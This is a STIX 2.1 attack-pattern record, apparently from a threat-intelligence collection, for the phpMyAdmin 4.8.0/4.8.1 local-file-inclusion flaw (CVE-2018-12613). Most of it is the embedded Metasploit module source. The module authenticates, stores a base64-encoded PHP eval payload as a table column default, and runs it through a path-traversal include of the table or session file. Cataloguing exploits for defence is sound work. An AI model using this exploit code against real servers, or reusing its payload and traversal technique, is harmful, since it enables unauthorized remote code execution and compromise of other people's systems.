{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d91751f4-8da2-4633-8df3-fcdd6ffddf3b",
    "created": "2024-08-14T17:07:49.167512Z",
    "modified": "2024-08-14T17:07:49.167516Z",
    "name": "phpMyAdmin Authenticated Remote Code Execution",
    "description": " phpMyAdmin v4.8.0 and v4.8.1 are vulnerable to local file inclusion which can be exploited post-authentication to execute PHP code by application. The module has been tested with phpMyAdmin v4.8.1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phpmyadmin_lfi_rce.rb",
            "external_id": "phpmyadmin_lfi_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-12613"
        },
        {
            "source_name": "reference",
            "url": "https://www.phpmyadmin.net/security/PMASA-2018-4/"
        },
        {
            "source_name": "reference",
            "url": "https://www.secpulse.com/archives/72817.html"
        },
        {
            "source_name": "reference",
            "url": "https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'phpMyAdmin Authenticated Remote Code Execution',\n      'Description'     => %q{\n        phpMyAdmin v4.8.0 and v4.8.1 are vulnerable to local file inclusion,\n        which can be exploited post-authentication to execute PHP code by\n        application. The module has been tested with phpMyAdmin v4.8.1.\n      },\n      'Author' =>\n        [\n          'ChaMd5', # Vulnerability discovery and PoC\n          'Henry Huang', # Vulnerability discovery and PoC\n          'Jacob Robles' # Metasploit Module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'BID', '104532' ],\n          [ 'CVE', '2018-12613' ],\n          [ 'CWE', '661' ],\n          [ 'URL', 'https://www.phpmyadmin.net/security/PMASA-2018-4/' ],\n          [ 'URL', 'https://www.secpulse.com/archives/72817.html' ],\n          [ 'URL', 'https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/' ]\n        ],\n      'Privileged'  => false,\n      'Platform'  => [ 'php' ],\n      'Arch'  => ARCH_PHP,\n      'Targets' =>\n        [\n          [ 'Automatic', {} ],\n          [ 'Windows', {} ],\n          [ 'Linux', {} ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2018-06-19'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base phpMyAdmin directory path\", '/phpmyadmin/']),\n        OptString.new('USERNAME', [ true, \"Username to authenticate with\", 'root']),\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", ''])\n      ])\n  end\n\n  def check\n    begin\n      res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path) })\n    rescue\n      vprint_error(\"#{peer} - Unable to connect to server\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.nil? || res.code != 200\n      vprint_error(\"#{peer} - Unable to query /js/messages.php\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    # v4.8.0 || 4.8.1 phpMyAdmin\n    if res.body =~ /PMA_VERSION:\"(\\d+\\.\\d+\\.\\d+)\"/\n      version = Rex::Version.new($1)\n      vprint_status(\"#{peer} - phpMyAdmin version: #{version}\")\n\n      if version == Rex::Version.new('4.8.0') || version == Rex::Version.new('4.8.1')\n        return Exploit::CheckCode::Appears\n      end\n      return Exploit::CheckCode::Safe\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def query(uri, qstring, cookies, token)\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'import.php'),\n      'cookie' => cookies,\n      'vars_post' => Hash[{\n        'sql_query' => qstring,\n        'db' => '',\n        'table' => '',\n        'token' => token\n      }.to_a.shuffle]\n    })\n  end\n\n  def lfi(uri, data_path, cookies, token)\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, 'index.php'),\n      'cookie' => cookies,\n      'encode_params' => false,\n      'vars_get' => {\n        'target' => \"db_sql.php%253f#{'/..'*16}#{data_path}\"\n      }\n    })\n  end\n\n  def exploit\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')\n    end\n\n    uri = target_uri.path\n    vprint_status(\"#{peer} - Grabbing CSRF token...\")\n\n    response = send_request_cgi({'uri' => uri})\n\n    if response.nil?\n      fail_with(Failure::NotFound, \"#{peer} - Failed to retrieve webpage grabbing CSRF token\")\n    elsif response.body !~ /token\"\\s*value=\"(.*?)\"/\n      fail_with(Failure::NotFound, \"#{peer} - Couldn't find token. Is URI set correctly?\")\n    end\n    token = Rex::Text.html_decode($1)\n\n    if target.name =~ /Automatic/\n      /\\((?<srv>Win.*)?\\)/ =~ response.headers['Server']\n      mytarget = srv.nil? ? 'Linux' : 'Windows'\n    else\n      mytarget = target.name\n    end\n\n    vprint_status(\"#{peer} - Identified #{mytarget} target\")\n\n    #Pull out the last two cookies\n    cookies = response.get_cookies\n    cookies = cookies.split[-2..-1].join(' ')\n\n    vprint_status(\"#{peer} - Retrieved token #{token}\")\n    vprint_status(\"#{peer} - Retrieved cookies #{cookies}\")\n    vprint_status(\"#{peer} - Authenticating...\")\n\n    login = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(uri, 'index.php'),\n      'cookie' => cookies,\n      'vars_post' => {\n        'token' => token,\n        'pma_username' => datastore['USERNAME'],\n        'pma_password' => datastore['PASSWORD']\n      }\n    })\n\n    if login.nil? || login.code != 302\n      fail_with(Failure::NotFound, \"#{peer} - Failed to retrieve webpage\")\n    end\n\n    #Ignore the first cookie\n    cookies = login.get_cookies\n    cookies = cookies.split[1..-1].join(' ')\n    vprint_status(\"#{peer} - Retrieved cookies #{cookies}\")\n\n    login_check = send_request_cgi({\n      'uri' => normalize_uri(uri, 'index.php'),\n      'vars_get' => { 'token' => token },\n      'cookie' => cookies\n    })\n\n    if login_check.nil?\n      fail_with(Failure::NotFound, \"#{peer} - Failed to retrieve webpage\")\n    elsif login_check.body.include? 'Welcome to'\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    elsif login_check.body !~ /token\"\\s*value=\"(.*?)\"/\n      fail_with(Failure::NotFound, \"#{peer} - Couldn't find token. Is URI set correctly?\")\n    end\n    token = Rex::Text.html_decode($1)\n\n    vprint_status(\"#{peer} - Authentication successful\")\n\n    #Generating strings/payload\n    database = rand_text_alpha_lower(5)\n    table = rand_text_alpha_lower(5)\n    column = rand_text_alpha_lower(5)\n    col_val = \"'<?php eval(base64_decode(\\\"#{Rex::Text.encode_base64(payload.encoded)}\\\")); ?>'\"\n\n\n    #Preparing sql queries\n    dbsql = \"CREATE DATABASE #{database};\"\n    tablesql = \"CREATE TABLE #{database}.#{table}(#{column} varchar(4096) DEFAULT #{col_val});\"\n    dropsql = \"DROP DATABASE #{database};\"\n    dirsql = 'SHOW VARIABLES WHERE Variable_Name Like \"%datadir\";'\n\n    #Create database\n    res = query(uri, dbsql, cookies, token)\n    if res.nil? || res.code != 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to create database\")\n    end\n\n    #Create table and column\n    res = query(uri, tablesql, cookies, token)\n    if res.nil? || res.code != 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to create table\")\n    end\n\n    #Find datadir\n    res = query(uri, dirsql, cookies, token)\n    if res.nil? || res.code != 200\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to find data directory\")\n    end\n\n    unless res.body =~ /^<td data.*?>(.*)?</\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Failed to find data directory\")\n    end\n\n    paths = []\n    #Creating include path\n    if mytarget == 'Windows'\n      #Table file location\n      tmp_path = $1.gsub(/\\\\/, '/')\n      tmp_path = tmp_path.sub(/^.*?\\//, '/')\n      tmp_path << \"#{database}/#{table}.frm\"\n      paths.append(tmp_path)\n    else\n      #Session path location\n      /phpMyAdmin=(?<session_name>.*?);/ =~ cookies\n      paths.append(\"/var/lib/php/sessions/sess_#{session_name}\")\n      paths.append(\"/var/lib/php5/sess_#{session_name}\")\n    end\n\n    paths.each {|data_path| lfi(uri, data_path, cookies, token)}\n\n    #Drop database\n    res = query(uri, dropsql, cookies, token)\n    if res.nil? || res.code != 200\n      print_error(\"#{peer} - Failed to drop database #{database}. Might drop when your session closes.\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-06-19",
    "x_mitre_platforms": [
        "[ 'php' ]"
    ]
}